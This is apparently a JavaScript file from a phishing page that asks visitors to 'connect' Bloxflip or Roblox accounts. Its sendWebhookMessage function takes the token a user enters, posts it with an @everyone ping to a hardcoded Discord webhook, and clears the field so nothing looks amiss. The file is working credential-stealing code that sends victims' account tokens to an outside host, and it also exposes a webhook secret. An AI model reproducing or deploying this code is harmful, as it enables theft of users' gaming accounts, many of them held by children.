function sendWebhookMessage(inputId) {
  var webhookURL = 'https://discord.com/api/webhooks/1310421042438737970/ZbtUrCRNEhkGCossz95H7KGsdue7OokTc8F0HePMaypb78L-328-5eqG1Fjtt3MHnN5';
  var input = document.getElementById(inputId);
  var token = input.value;
  var message = "@everyone User entered token: " + token;

  var xhr = new XMLHttpRequest();
  xhr.open("POST", webhookURL, true);
  xhr.setRequestHeader("Content-Type", "application/json");
  xhr.send(JSON.stringify({ content: message }));

  input.value = "";
}

function showBloxflipBox() {
  document.getElementById("connectAccountBox").style.animation = "fadeOut 0.5s forwards";
  document.getElementById("bloxflipBox").style.animation = "fadeIn 0.5s forwards";
  document.getElementById("bloxflipBox").style.display = "block";
  document.getElementById("robloxBox").style.display = "none";
}

function showRobloxBox() {
  document.getElementById("connectAccountBox").style.animation = "fadeOut 0.5s forwards";
  document.getElementById("robloxBox").style.animation = "fadeIn 0.5s forwards";
  document.getElementById("robloxBox").style.display = "block";
  document.getElementById("bloxflipBox").style.display = "none";
}
